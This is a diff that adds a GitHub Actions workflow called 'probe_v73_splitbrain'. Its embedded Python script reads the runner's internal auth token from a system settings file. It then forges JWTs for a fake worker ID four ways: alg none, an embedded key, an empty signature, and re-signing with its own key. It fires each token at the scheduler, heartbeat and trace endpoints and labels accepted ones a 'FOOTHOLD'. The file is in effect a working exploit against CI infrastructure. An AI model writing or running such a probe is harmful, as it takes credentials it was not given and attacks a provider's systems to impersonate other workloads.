@@ -1,0 +1,86 @@
+name: probe_v73_splitbrain
+on:
+  workflow_dispatch:
+jobs:
+  splitbrain:
+    runs-on: ubuntu-latest
+    steps:
+      - name: endpoint-validation-split-brain
+        continue-on-error: true
+        run: |
+          python3 -m pip install --quiet cryptography 2>/dev/null || pip3 install --quiet cryptography
+          python3 - <<'PYEOF'
+          import json, base64, urllib.request, urllib.error, uuid
+          from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
+          from cryptography.hazmat.primitives import serialization
+
+          s=json.load(open('/opt/hca/.settings'))
+          tok=s['authToken']; sched=s['schedulerApiUrl']
+          trace=s.get('traceApiUrl',''); wtr=s.get('watchdogTraceApiUrl','')
+          host=sched.split('//')[0]+'//'+sched.split('//')[1].split('/')[0]
+
+          def b64u(b):
+              if isinstance(b,str): b=b.encode()
+              return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+          def b64ud(x):
+              x+='='*(-len(x)%4); return base64.urlsafe_b64decode(x)
+          hdr=json.loads(b64ud(tok.split('.')[0])); claims=json.loads(b64ud(tok.split('.')[1]))
+          kid=hdr.get('kid'); wid=claims.get('wid',''); parts=wid.split(':')
+          forged_wid=(parts[0]+':'+str(uuid.uuid4())+':'+str(uuid.uuid4())) if len(parts)==3 else str(uuid.uuid4())
+          print('REAL_WID='+wid); print('FORGED_WID='+forged_wid)
+
+          priv=Ed25519PrivateKey.generate()
+          pub=priv.public_key().public_bytes(serialization.Encoding.Raw,serialization.PublicFormat.Raw)
+          our_jwk={'kty':'OKP','crv':'Ed25519','x':b64u(pub)}
+
+          def mk_none(w):
+              fh={'alg':'none','typ':'JWT'}; fc=dict(claims); fc['wid']=w
+              return b64u(json.dumps(fh,separators=(',',':')))+'.'+b64u(json.dumps(fc,separators=(',',':')))+'.'
+          def mk_jwk(w):
+              fh={'alg':'EdDSA','typ':'JWT','jwk':our_jwk}; fc=dict(claims); fc['wid']=w
+              sg=b64u(json.dumps(fh,separators=(',',':')))+'.'+b64u(json.dumps(fc,separators=(',',':')))
+              return sg+'.'+b64u(priv.sign(sg.encode()))
+          def mk_emptysig(w):
+              fh={'alg':'EdDSA','typ':'JWT','kid':kid}; fc=dict(claims); fc['wid']=w
+              return b64u(json.dumps(fh,separators=(',',':')))+'.'+b64u(json.dumps(fc,separators=(',',':')))+'.'
+          def mk_ourkey(w):  # real header/kid but signed with OUR key (server's pinned key should reject)
+              fh={'alg':'EdDSA','typ':'JWT','kid':kid}; fc=dict(claims); fc['wid']=w
+              sg=b64u(json.dumps(fh,separators=(',',':')))+'.'+b64u(json.dumps(fc,separators=(',',':')))
+              return sg+'.'+b64u(priv.sign(sg.encode()))
+
+          tokens={'REAL':tok,'alg_none':mk_none(forged_wid),'jwk_embed':mk_jwk(forged_wid),
+                  'empty_sig':mk_emptysig(forged_wid),'ourkey_resign':mk_ourkey(forged_wid)}
+
+          def call(method, url, token, body):
+              data=json.dumps(body).encode() if body is not None else None
+              r=urllib.request.Request(url,data=data,method=method)
+              r.add_header('Authorization','Bearer '+token); r.add_header('Content-Type','application/json')
+              try:
+                  resp=urllib.request.urlopen(r,timeout=15); return resp.status, resp.read(160).decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read(180).decode('utf-8','replace')
+              except Exception as e:
+                  return 'ERR', str(e)[:80]
+
+          trace_body=[{'level':0,'message':'sb-'+str(uuid.uuid4()),'allocationId':forged_wid}]
+          hb_body={'allocationId':forged_wid}
+
+          # endpoint matrix: (label, method, url, body)
+          eps=[]
+          if trace: eps.append(('TRACE','POST',trace,trace_body))
+          if wtr:   eps.append(('WATCHDOG','POST',wtr,trace_body))
+          eps.append(('SCHED_heartbeat','PUT',sched+'/request/heartbeat',hb_body))
+          eps.append(('SCHED_getreq','GET',sched+'/request',None))
+          eps.append(('VM_v1_request','GET',host+'/vm/v1/request',None))
+
+          print('=== SPLIT-BRAIN MATRIX (endpoint x forged-token) ===')
+          print('SIGNAL: a FORGED token (not REAL) returning 2xx = endpoint does NOT validate signature = FOOTHOLD')
+          for ep_label, method, url, body in eps:
+              for tlabel, tk in tokens.items():
+                  st, b = call(method, url, tk, body)
+                  flag=''
+                  if tlabel!='REAL' and isinstance(st,int) and 200<=st<300:
+                      flag=' <<< WEAK-VALIDATION FOOTHOLD'
+                  print('%-16s %-14s -> %s%s | %s' % (ep_label, tlabel, st, flag, b[:90].replace(chr(10),' ')))
+          print('=== DONE ===')
+          PYEOF
